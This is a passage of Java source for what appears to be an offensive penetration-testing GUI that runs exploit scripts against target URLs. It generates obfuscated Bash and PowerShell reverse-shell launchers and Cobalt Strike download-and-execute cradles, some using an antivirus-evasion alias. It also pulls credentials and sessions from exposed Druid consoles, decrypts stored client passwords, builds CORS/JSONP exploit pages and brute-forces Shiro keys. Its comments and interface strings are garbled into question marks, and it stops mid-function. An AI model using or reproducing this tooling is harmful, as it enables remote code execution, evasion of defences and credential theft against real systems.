            //???????????????????????????
            mLabel2.setText(responsetime);

            //????????????????????????
            mTextArea2.setText(responseheaderbody);
        }
    }

    @FXML
    //??????????????????????????????????????????????????????
    public void onButton2Click(ActionEvent event) {

        //??????????????????????????????
        String words = mTextField1.getText().trim();

        //????????????????????????
        String time = mTextField2.getText().trim();

        //??????????????????body
        String responsebody = mTextArea2.getText().trim();

        //??????????????????
        String responsetime = mLabel2.getText().trim();

        if (words.equals("")){
            if (responsetime.compareTo(time) >= 0) {
                mLabel4.setText("???????????????????????????exp?????????");
            } else {
                mLabel4.setText("?????????????????????????????????????????????????????????");
            }
        }else if(time.equals("")){
            if (responsebody.contains(words)) {
                mLabel4.setText("???????????????????????????exp?????????");
            } else {
                mLabel4.setText("?????????????????????????????????????????????????????????");
            }
        }else {
            if (time.compareTo(responsetime) >= 0 || responsebody.contains(words)) {
                mLabel4.setText("???????????????????????????exp?????????");
            } else {
                mLabel4.setText("?????????????????????????????????????????????????????????");
            }
        }
    }

    @FXML
    // ??????????????????exp???yml????????????
    public void onButton3Click(ActionEvent event) throws IOException {
        JarFile jarFile;
        String[][] request_header;
        /*
        * GET
        http://www.baidu.com
        HTTP/1.1
        /
        a=1

        accept: 1
        user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)
        token: 123
        Connection: keep-alive */

        // ??????expname exp?????????
        String expname = mTextField3.getText().trim();

        // ??????expname exp?????????
        String expdescribe = mTextArea3.getText().trim();

        //??????????????????????????????
        String words = mTextField1.getText().trim();

        //????????????????????????
        String time = mTextField2.getText().trim();

        // ??????yml?????????
        String ymlname = mTextField4.getText().trim();

        boolean isallowredirects = true;

        if (mRadiobutton1.isSelected())
            isallowredirects = false;

//        expdescribe = "'" + expdescribe + "'";

        // ???????????????



//        String[][] request_header = Readfile.readFileByLines("property/test.txt");
        String os = System.getProperty("os.name");
        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        if (jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")){ //???????????????jar?????????

            jarFile= new JarFile(jarPath);

            JarEntry jarEntry = jarFile.getJarEntry("test.txt");

            request_header = Readfile.readFileByLines(jarEntry);

        }else if (jarPath.contains(".jar") && os.toLowerCase().startsWith("win")){
            request_header = Readfile.readFileByLines("property/test.txt");
        }else{ // ???jar??????????????????jar???test
            request_header = Readfile.readFileByLines("test.txt");
        }


        System.out.println(ymlname);

        boolean a =  Readfile.datatoymlFile(request_header,"poc/" + ymlname ,words,time,expname,expdescribe,isallowredirects);

        ObservableList<String> strList = dirnametlistview1("poc");


        if(os.toLowerCase().startsWith("win")) {
            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }
        mListView1.setItems(strList);

    }

    @FXML
    // ??????????????????
    public void onButton4Click(ActionEvent event) throws FileNotFoundException {

//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
//            String[] ipportlist = mLabeltest.getText().trim().split(":");
//            System.setProperty("https.proxyHost", ipportlist[2]);
//            System.setProperty("https.proxyPort", ipportlist[3]);
//            System.setProperty("http.proxyHost", ipportlist[2]);
//            System.setProperty("http.proxyPort", ipportlist[3]);
//            // http??????
//        }else{
//            System.setProperty("https.proxyHost", "");
//            System.setProperty("https.proxyPort", "");
//            System.setProperty("http.proxyHost", "");
//            System.setProperty("http.proxyPort", "");
//        }
//
//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
//            String[] ipportlist = mLabeltest.getText().trim().split(":");
//            System.getProperties().put("socksProxySet","true");
//            System.getProperties().put("socksProxyHost",ipportlist[2]);
//            System.getProperties().put("socksProxyPort",ipportlist[3]);
//            // socks??????
//        }else{
//            System.getProperties().put("socksProxySet","false");
//            System.getProperties().put("socksProxyHost","");
//            System.getProperties().put("socksProxyPort","");
//        }
        proxy();

        //??????url
        String url = mTextField5.getText().trim();
//        //?????????????????????????????????
//        String times = mText3.getText().trim();

        //??????????????????????????????
        String words = mText4.getText().trim();
        String ishttps = "http";

        if (url.contains("https") )
                ishttps = "https";

        String[] poctoexplist ;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win"))
            poctoexplist = poctoexp(System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem(),url,ishttps);

        else
            poctoexplist = poctoexp("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem(),url,ishttps);

        //???????????????????????????
        mText5.setText(poctoexplist[0]);

        //????????????????????????
        mTextArea4.setText(poctoexplist[1]);

        if (words.equals("null")){
            mText6.setText("?????????????????????????????????\n(????????????????????????exp)");
        } else {
            if ( poctoexplist[1].contains(words)) {
                //???????????????????????????????????????
                mText6.setText("??????????????????????????????");
            } else {
                mText6.setText("?????????????????????????????????\n(????????????????????????exp)");
            }
        }
    }

    @FXML
    // ??????????????????
    public void onButton5Click(ActionEvent event) throws IOException {

    Stage stage=new Stage();
    Parent root = FXMLLoader.load(getClass().getResource("/proxy.fxml"));
    stage.setTitle("????????????");
    stage.setScene(new Scene(root));
    stage.show();
    //???????????????????????????map???
    StageManager.STAGE.put("second", stage);
    //?????????????????????map???
    StageManager.CONTROLLER.put("Poc2ExpguiController", this);

//    ProxyController second2=(ProxyController) StageManager.CONTROLLER.get("ProxyController");

//    String ipporthttp = second2.mTextField66.getText().trim();
//    System.out.println(ipporthttp);
//    if (ipporthttp.equals("")){
//        second2.mTextField66.setText("127.0.0.1:8080");
//    }else{
//        String index_ipport = mLabeltest.getText().trim();
//        String[] index_ipport_lists = index_ipport.split("ip:port???:");
//        second2.mTextField66.setText(index_ipport_lists[1]);
//    }

    }

    @FXML
    // ??????exp??????????????????
    public void onButton6Click(ActionEvent event) throws IOException {

        String filename = "poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem();

        String expname = mTextField6.getText();

        String expdescribe = mTextAreatest.getText();

        System.out.println( expname +'\n' + expdescribe);
        System.out.println(filename);

        modifyFileContent(filename,"expname", expname );
        modifyFileContent(filename,"expdescribe" ,expdescribe );
    }

    @FXML
    // ????????????
    public void onButton7Click(ActionEvent event) throws IOException {

//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
//            String[] ipportlist = mLabeltest.getText().trim().split(":");
//            System.setProperty("https.proxyHost", ipportlist[2]);
//            System.setProperty("https.proxyPort", ipportlist[3]);
//            System.setProperty("http.proxyHost", ipportlist[2]);
//            System.setProperty("http.proxyPort", ipportlist[3]);
//            // http??????
//        }else{
//            System.setProperty("https.proxyHost", "");
//            System.setProperty("https.proxyPort", "");
//            System.setProperty("http.proxyHost", "");
//            System.setProperty("http.proxyPort", "");
//        }
//
//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
//            String[] ipportlist = mLabeltest.getText().trim().split(":");
//            System.getProperties().put("socksProxySet","true");
//            System.getProperties().put("socksProxyHost",ipportlist[2]);
//            System.getProperties().put("socksProxyPort",ipportlist[3]);
//            // socks??????
//        }else{
//            System.getProperties().put("socksProxySet","false");
//            System.getProperties().put("socksProxyHost","");
//            System.getProperties().put("socksProxyPort","");
//        }
        // todo python???????????????????????????????????????

        //??????url
        String url = mTextArea5.getText().trim();

//        String[] urllist = url.split("\n");
//        for (String str : urllist)
//            System.out.println(str);

//        //?????????????????????????????????
//        String times = mText3.getText().trim();
//
//        //??????????????????????????????
//        String words = mText4.getText().trim();
//
//        if (times.equals("null"))
//            times = "0";
//
//        if (words.equals("null"))
//            words = "";

        // ????????????
//        List<String> vulurllist = poctoexp("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem(), urllist ,Integer.parseInt(times),words);
//
//        System.out.println(vulurllist);
//
//        for (String str:vulurllist)
//            total = total + str +'\n';

        poctoFile(url, "pythonexp/url.txt");
        String pythonscript = "pythonexp/poc2jarpiliang.py";
        String ymlFile = "poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() ;
        System.out.println(ymlFile);
        String pythonpath = mTextField82.getText().trim();
        String total = "";
        String[] command = new String[100];
        command[0] = pythonpath;
        command[1] = pythonscript;
        command[2] = ymlFile;

        String[] commands = deleteArrayNull(command);

        for (String s : commands)
            System.out.println(s);

        try {
            Process pro = Runtime.getRuntime().exec(commands);
            InputStream is1 = pro.getInputStream();
            InputStream is2 = pro.getErrorStream();
            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
            BufferedReader buf2 = new BufferedReader(new InputStreamReader(is2));

            String line = null;
            while ((line = buf.readLine()) != null) {
                total = total + '\n' + line;
                mTextArea5.setText(total.trim()); // ???python????????????????????????
                System.out.println(line);
            }
            while ((line = buf2.readLine()) != null) {
                total = total + '\n' + line;
                mTextArea5.setText(total.trim()); // ???python????????????????????????
                System.out.println(line);
            }

        } catch (Exception e) {
            // TODO: handle exception
        }

    }


    @FXML
    // tasklist /svc??????
    public void onButton8Click(ActionEvent event) throws IOException {

        //??????tasklist /svc?????????
        String tasklist = mTextArea6.getText().trim();

        Map<String,String> exelist = new HashMap<String, String>();

        String[] exetestlist = readFileByLines("property/exetest.txt");
        for (String str : exetestlist)
            if (str!=null) {
//                System.out.println( "exetestlist" + str);
                exelist.put(str.split(": ")[0], str.split(": ")[1]);
            }
        String[] resultlist2 = tasklist.split("\n"); // ???????????????????????????????????????????????????
        String[] resultlist22 ;

//        System.out.println(exelist);

        resultlist22 = taskexechange(resultlist2);

        String finallist = ifexe(resultlist22,exelist);

        mTextArea7.setText(finallist);


    }

    // python????????????
    public void onButton9Click(ActionEvent actionEvent) {
        String pythonpath ;
        String pythonscript = "pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + '/' +mListView5.getSelectionModel().getSelectedItem();

        String python2or3 = mLabeltest2.getText().trim();

        if (python2or3.contains("python2")) {
            pythonpath = mTextField8.getText().trim(); // python2??????
        }else{
            pythonpath = mTextField82.getText().trim(); // python3??????
        }
        String params = mTextField7.getText().trim();
        String total = "";
        String[] paramlist = params.split(" ");
        String[] command = new String[100];
        command[0] = pythonpath;
        command[1] = pythonscript;

        for ( int i = 2; i < paramlist.length + 2; i ++ )
            command[i] = paramlist[i-2];

        String[] commands = deleteArrayNull(command);

        for (String s : commands)
            System.out.println(s);

        try {
            Process pro = Runtime.getRuntime().exec(commands);
            InputStream is1 = pro.getInputStream();
            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
            InputStream is2 = pro.getErrorStream();
            BufferedReader buf2 = new BufferedReader(new InputStreamReader(is2));
            String line = null;
            while ((line = buf.readLine()) != null) {
                total = total + '\n' + line;
                mTextArea9.setText(total); // ???python????????????????????????
                System.out.println(line);
            }
            while ((line = buf2.readLine()) != null) {
                total = total + '\n' + line;
                mTextArea9.setText(total); // ???python????????????????????????
                System.out.println(line);
            }
//            if (mTextArea9.getText().equals("")){
//                mTextArea9.setText("??????????????????????????????????????????");
//            }

        } catch (IOException e) {
            total = total + e.toString();
            mTextArea9.setText(total); // ???python????????????????????????
        }

    }

    // finalshell???????????????seeyon???????????????????????????
    // druid ????????????
    public void onButton10Click(ActionEvent actionEvent) throws Exception {
        String total = "";
        //????????????????????????
        String encode = mTextArea10.getText().trim();
        if (!encode.equals("")) {
            String[] encodes = encode.split("\n");
            for (String str : encodes)
                if (str != null) {
                    total = total + '\n' + str + "[decode]:" + decodePass(str);
                }
            mTextArea10.setText(total.trim());
        }

        String total2 = "";
        //????????????????????????
        String encode2 = mTextArea11.getText().trim();
        if (!encode2.equals("")) {
            String[] encodes2 = encode2.split("\n");
            for (String str : encodes2)
                if (str != null) {
                    String asciis = stringToAscii(jdkBas64Decode2(str));
                    total2 = total2 + '\n' + str + "[decode]:" + asciiToString(asciis);
                }
            mTextArea11.setText(total2.trim());
        }

        String total3 = "";
        //????????????????????????
        String encode3 = mTextArea12.getText().trim();
        if (!encode3.equals("")) {
            if (mRadiobutton2.isSelected()){ // ????????????1.0.16???????????????
                String[] encodes31 = encode3.split("\n");
                String publicKey = encodes31[0];
                String cipherText = encodes31[1];
                String decryptPassword = ConfigTools.decrypt(publicKey, cipherText);
                System.out.println("decryptPassword???" + decryptPassword);
                total3 = total3 + '\n' + encode3 + "[decode]:" + decryptPassword;
            }
            else {
                String[] encodes3 = encode3.split("\n");
                for (String str : encodes3)
                    if (str != null) {
                        total3 = total3 + '\n' + str + "[decode]:" + ConfigTools.decrypt(str);
                    }
            }
            mTextArea12.setText(total3.trim());
        }
    }

    // unicode???????????????
    public void onButton13Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(UnicodeDecode(mTextArea13content));
    }

    // ?????????unicode??????
    public void onButton14Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(UnicodeEncode(mTextArea13content));
    }

    // URL????????????
    public void onButton15Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        String decode_text = "";

        // ????????????url??????????????????????????????????????????
        mTextArea13content = mTextArea13content.replaceAll("%(?![0-9a-fA-F]{2})", "%25");

        //
        //try {
        decode_text = URLEncoder.encode(mTextArea13content, "utf-8");
        //}catch (Exception e){
        //
        //}
        mTextArea13.setText(decode_text);
    }

    // URL????????????
    public void onButton16Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(UnicodeDecode(URLDecoder.decode(mTextArea13content,"utf-8")));


        
    }

    // Base64????????????
    public void onButton17Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        String base64encodedString = Base64.getEncoder().encodeToString(mTextArea13content.getBytes(StandardCharsets.UTF_8));
        mTextArea13.setText(base64encodedString);
    }

    // Base64????????????
    public void onButton18Click(ActionEvent actionEvent) throws IllegalArgumentException {
        String total = "";
        String mTextArea13content = mTextArea13.getText().trim();
        // ??????????????????????????????????????????????????????
        try {
            byte[] base64decodedBytes = Base64.getDecoder().decode(mTextArea13content);
            total = total + "????????????????????????\n" + UnicodeDecode(new String(base64decodedBytes, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try {
            byte[] base64decodedBytes0 = Base64.getDecoder().decode(mTextArea13content + "="); // ?????????????????????
            total = total + "\n\n" + "??????????????????=???\n" + UnicodeDecode(new String(base64decodedBytes0, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try {
            byte[] base64decodedBytes1 = Base64.getDecoder().decode(mTextArea13content + "=="); // ?????????????????????
            total = total + "\n\n" + "??????????????????=???\n" + UnicodeDecode(new String(base64decodedBytes1, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try {
            byte[] base64decodedBytes2 = Base64.getDecoder().decode(mTextArea13content.substring(2)); // ?????????????????????
            total = total + "\n\n" + "?????????????????????\n" + UnicodeDecode(new String(base64decodedBytes2, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try{
        byte[] base64decodedBytes3 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-64)); // ??????????????????
        total = total + "\n\n" + "?????????????????????\n" + UnicodeDecode(new String(base64decodedBytes3, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try{
        byte[] base64decodedBytes4 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-32)); // ??????????????????
        total = total + "\n\n" + "?????????????????????\n" + UnicodeDecode(new String(base64decodedBytes4, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try{
            byte[] base64decodedBytes5 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-16)); // ??????????????????
            total = total + "\n\n" + "??????????????????\n" + UnicodeDecode(new String(base64decodedBytes5, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        if (total.equals("")){
            total = total + mTextArea13content +  "????????????";
        }
        mTextArea13.setText(total);
    }

    // Hex????????????
    public void onButton19Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(str2HexStr(mTextArea13content,"utf-8"));
    }

    // Hex????????????
    public void onButton20Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(hexStr2Str(mTextArea13content,"utf-8"));
    }

    // Hex????????????
    public void onButton21Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(HtmlEncode(mTextArea13content));
    }

    // Hex????????????
    public void onButton22Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(HtmlDecode(mTextArea13content));
    }


    // ascii????????????
    public void onButton23Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(AsciiEncode(mTextArea13content));
    }

    // ascii????????????
    public void onButton24Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        String[] t = mTextArea13content.split(" ");
        String total = "";
        for (String ts:t)
            total = total + byteAsciiToChar(Integer.parseInt(ts));
        mTextArea13.setText(total.trim());
    }

    public void mRadiobutton3Click(ActionEvent actionEvent) throws Exception {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
        outputString = outputString + "bash -c {echo," + base64encodedString + "}|{base64,-d}|{bash,-i}\n\n??????\n\n" + "echo, " + base64encodedString + "| base64 -d|bash -i" ;
        mTextArea15.setText(outputString);
    }

    public void mRadiobutton4Click(ActionEvent actionEvent) throws Exception {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        byte[] sb2 = inputString.getBytes();
        int i = 0;
        byte[] bt3 = new byte[sb2.length+sb2.length];
        for (byte btest:sb2) {
            bt3[i++] = btest;
            bt3[i++] = (byte)0x00;
        }
        String str= new String (bt3);
        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
        outputString = outputString + "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + base64encodedString ;

        mTextArea15.setText(outputString);

    }

    public void mRadiobutton5Click(ActionEvent actionEvent) throws Exception {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
        outputString = outputString + "python -c exec('" + base64encodedString + "'.decode('base64'))";
        mTextArea15.setText(outputString);

    }

    public void mRadiobutton6Click(ActionEvent actionEvent) throws Exception {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
        outputString = outputString + "perl -MMIME::Base64 -e eval(decode_base64('" + base64encodedString + "'))";
        mTextArea15.setText(outputString);

    }

    // cs????????????cs payload????????????????????????????????????
    public void csEncode1(KeyEvent event) throws IOException {
        String inputString = mTextField9.getText().trim();
        String outputString1 = "";
        String outputString2 = "";
        String outputString3 = "";
        String outputString4 = "";

        outputString1 = "powershell -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('" + inputString.substring(0,2) +"'+'" + inputString.substring(2) + "'))\"";
        mTextArea16.setText(outputString1); // ????????????

        String strtest = "IEX (New-Object System.Net.Webclient).DownloadString('" + inputString + "')";

        byte[] sb2 = strtest.getBytes();
        int i = 0;
        byte[] bt3 = new byte[sb2.length+sb2.length];
        for (byte btest:sb2) {
            bt3[i++] = btest;
            bt3[i++] = (byte)0x00;
        }
        String str= new String (bt3);
        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
        mTextArea17.setText("powershell -enc " + base64encodedString); // ????????????


        outputString2 = "powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('" +  inputString + "')";
        mTextArea18.setText(outputString2); // ????????????

        outputString3 = "powershell set-alias -name kaspersky -value Invoke-Expression;\"$a1='kaspersky ((new-object net.webclient).downl';$a2='oadstring(''" +  inputString + "''))';$a3=$a1,$a2;kaspersky(-join $a3)\"";
        mTextArea19.setText(outputString3); // ????????????

        outputString4 = "powershell -NoExit $c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''" +  inputString + "'')'.Replace('123','adString');IEX ($c1+$c2)";
        mTextArea20.setText(outputString4); // ????????????


    }



    @FXML
    // ????????????
    // mTextArea14 ?????????????????????????????????
    public void shellEncode(KeyEvent event) throws FileNotFoundException {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        if (mRadiobutton3.isSelected()){ // ??????Bash
            String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
            outputString = outputString + "bash -c {echo," + base64encodedString + "}|{base64,-d}|{bash,-i}\n\n??????\n\n" + "echo, " + base64encodedString + "| base64 -d|bash -i";

        }else if(mRadiobutton4.isSelected()){ // ??????Powershell
            byte[] sb2 = inputString.getBytes();
            int i = 0;
            byte[] bt3 = new byte[sb2.length+sb2.length];
            for (byte btest:sb2) {
                bt3[i++] = btest;
                bt3[i++] = (byte)0x00;
            }
            String str= new String (bt3);
            String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
            outputString = outputString + "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + base64encodedString ;

        }else if(mRadiobutton5.isSelected()){ // ??????Python
            String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
            outputString = outputString + "python -c exec('" + base64encodedString + "'.decode('base64'))";

        }else if(mRadiobutton6.isSelected()){ // ??????Perl
            String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
            outputString = outputString + "perl -MMIME::Base64 -e eval(decode_base64('" + base64encodedString + "'))";
        }
        mTextArea15.setText(outputString);
    }


    // ??????????????????exp????????????
    public void onButton11Click(ActionEvent actionEvent) throws Exception {
        //??????url
        String url = mTextField51.getText().trim();
        String pythonscript = "pythonexp/poc2jarpiliangyml.py";
        String pythonpath = mTextField82.getText().trim();
        String exppath;
        //try {
        exppath = mListView1.getSelectionModel().getSelectedItem();
        //}catch (Exception e){
        //    exppath = "/";
        //}
        String isproxy = "0";
        String host = "127.0.0.1";
        String port = "8080";
        if (exppath == null)
            exppath = "/";
        else if (!exppath.contains("/"))
            exppath = "/" + exppath;

            String[] ipportlist = mLabeltest.getText().trim().split(":");

            if (ipportlist.length > 1) {
                isproxy = "1";
                host = ipportlist[2];
                port = ipportlist[3];
            }


        String total = "";
        String[] command = new String[100];
        command[0] = pythonpath;
        command[1] = pythonscript;
        command[2] = "-u";
        command[3] = url;
        command[4] = "-r";
        command[5] =  exppath;
        command[6] = "-x";
        command[7] =  isproxy;
        command[8] = "-h";
        command[9] =  host;
        command[10] = "-p";
        command[11] =  port;

        String[] commands = deleteArrayNull(command);

        for (String s : commands)
            System.out.println(s);

        try {
            Process pro = Runtime.getRuntime().exec(commands);
            InputStream is1 = pro.getInputStream();
            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
            String line = null;
            while ((line = buf.readLine()) != null) {
                total = total + '\n' + line;
                mTextArea5.setText(total.trim()); // ???python????????????????????????
                System.out.println(line);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    // ??????CS payload??????
    public void onButton25Click(ActionEvent actionEvent) throws IOException {
        String inputString = mTextField9.getText().trim();
        String python2path = mTextField8.getText().trim(); // python2 ??????
        String python3path = mTextField82.getText().trim(); // python3 ??????

        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // ??????config.properties????????????

        String os = System.getProperty("os.name");


        if (!jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")) {

            System.out.println("???jar????????????");

        }else if(os.toLowerCase().startsWith("win")){
            String target = "python2path=" + python2path + '\n' + "python3path=" + python3path + '\n' + "cspayload=" + inputString;
            poctoFile(target, "property/config.properties");

        }else{
            Properties prop = new Properties();
            prop.load(Main.class.getResourceAsStream("/config.properties"));  // ???????????????

            prop.setProperty("python2path", python2path);
            prop.setProperty("python3path", python3path);
            prop.setProperty("cspayload", inputString);
            String tempPath = jarPath.substring(0, jarPath.lastIndexOf("/")) + "/config.properties";

            System.out.println(tempPath);
            Writer w = new FileWriter(tempPath);
            prop.store(w, "python run path");
            w.close();
            String[] command = new String[100];
            command[0] = "jar";
            command[1] = "uf";
            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
            command[3] = "config.properties";
            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties ??????jar?????????config.properties??????

            String[] commands = deleteArrayNull(command);
            for (String s : commands)
                System.out.println(s);

            try {
                Process pro = Runtime.getRuntime().exec(commands);
                String[] command2 = new String[100];
                Robot r = new Robot();
                r.delay(500);
                command2[0] = "rm";
                command2[1] = tempPath;
                String[] commands2 = deleteArrayNull(command2);
                Process pro2 = Runtime.getRuntime().exec(commands2);

            } catch (Exception e) {
                // TODO: handle exception
            }
        }
    }

    // druid?????????????????????
    public void onButton26Click(ActionEvent actionEvent) throws Exception {
        proxy();
        String druidVulnUrl = mTextField10.getText().trim(); // druid????????????
        String[] JdbcUsername  = getJdbcUsername(druidVulnUrl);
        mTextField11.setText(JdbcUsername[0]);  // jdbc??????
        mTextField12.setText(JdbcUsername[1]);  // ??????????????????

        String[] sqlList = getSql(druidVulnUrl);
        String sql = "";
        for(int i=0;i<sqlList.length;i++)
            sql = sql  + sqlList[i] + "\n\n";
        mTextArea21.setText(sql); // sql??????

        String[][] lists = getUri(druidVulnUrl);
        String uriLists = "";
        for(int i = 0;i<lists.length-1;i++)
            for(int j = i+1;j<lists.length-1;j++)
                if (lists[i][0] != null && lists[j][0] != null ) {
                    if ( Integer.parseInt(lists[i][2]) < Integer.parseInt(lists[j][2])){
                        String[][] mid = new String[1][3];
                        mid[0][0] = lists[i][0];
                        mid[0][1] = lists[i][1];
                        mid[0][2] = lists[i][2];
                        lists[i][0] = lists[j][0];
                        lists[i][1] = lists[j][1];
                        lists[i][2] = lists[j][2];
                        lists[j][0] = mid[0][0];
                        lists[j][1] = mid[0][1];
                        lists[j][2] = mid[0][2];
                    }
                }
        for(int i = 0;i<lists.length;i++)
            if (lists[i][0] != null )
                uriLists = uriLists + lists[i][0] + '\n';

        mTextArea22.setText(uriLists);

        String[] sessionList = getSession(druidVulnUrl);
        String session = "";
        for(int i=0;i<sessionList.length;i++)
            session = session + sessionList[i] + '\n';
        mTextArea24.setText(session); // session
    }

    // ??????poc???cors???jsonp
    public void onButton27Click(ActionEvent actionEvent) throws Exception {
        String http = "http"; // ???????????????http

        if(mRadiobutton7.isSelected()) { // ??????CORS??????
            String httpRequests = mTextArea25.getText().trim(); // CORS????????????
            if (mRadiobutton9.isSelected())
                http = "https";
            String CorsContent = CorsPocMake(httpRequests,http);
            mTextArea26.setText(CorsContent);

        }else if(mRadiobutton8.isSelected()){
            String jsonpVulnurl = mTextArea25.getText().trim(); // jsonp??????
            String Content = JsonpPocMake(jsonpVulnurl);
            mTextArea26.setText(Content);
        }
    }

    public void onButton28Click(ActionEvent actionEvent) throws Exception {
        String fileContent = mTextArea26.getText();
        String filename = "";
        if(mRadiobutton7.isSelected())  // ??????CORS??????
            filename = "poc2jar-cors";
        if(mRadiobutton8.isSelected())  // ??????JSONP??????
            filename = "poc2jar-jsonp";
        Stage stage=new Stage();
        FileChooser fileChooser = new FileChooser();
        fileChooser.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("HTML", "*.html"),
                new FileChooser.ExtensionFilter("JavaScript", "*.js")
        );
        fileChooser.setInitialFileName(filename);
        File file2 = fileChooser.showSaveDialog(stage);
        fileChooser.setTitle("??????html??????");
//        System.out.println(file2.getAbsolutePath());
        if (file2 != null) {
            if(!file2.exists())
            {
                try {
                    file2.createNewFile();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            try (FileWriter fileWriter = new FileWriter(file2.getAbsolutePath())) {
                fileWriter.append(fileContent);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    // shiro rememberme????????????
    public void onButton29Click(ActionEvent actionEvent) throws Exception {
        byte[] fileContents;
        String total = "";
        String key ;
        SerializationDumper sd = new SerializationDumper();
        String rememberMe = mTextArea27.getText().trim();
        Expdecode shiroDecypt = new Expdecode();
        try {
            if (mRadiobutton11.isSelected()) {
                fileContents = shiroDecypt.BruteCipherKeygcm( rememberMe , "property/keys.conf");
                key = shiroDecypt.BruteCipherKeygcm( rememberMe , "property/keys.conf", "1");
            } else {
                fileContents = shiroDecypt.BruteCipherKey( rememberMe , "property/keys.conf");
                key = shiroDecypt.BruteCipherKey( rememberMe , "property/keys.conf", "1");
            }

            mTextField13.setText(key);

            for (int i = 0; i < fileContents.length; ++i) {
                sd._data.add(fileContents[i]);
            }

            sd._enablePrinting = false;
            sd.parseStream();

            String[] command = new String[100];
            command[0] = "java";
            command[1] = "-jar";
            command[2] = "property/fernflower.jar";
            command[3] = "property/bytecodes.class";
            command[4] = "property/";
            String[] commands = deleteArrayNull(command); // class???????????????java??????

            try {
                Process pro = Runtime.getRuntime().exec(commands);
                Robot r = new Robot();
                r.delay(3000);
                File f = new File("property/bytecodes.java");

                File f2 = new File( "property/bytecodes.class");
                File f3 = new File( "property/shiro.ser");
//            System.out.println(tempPath + "/property/shiro.ser");

//                System.out.println(f3.delete());
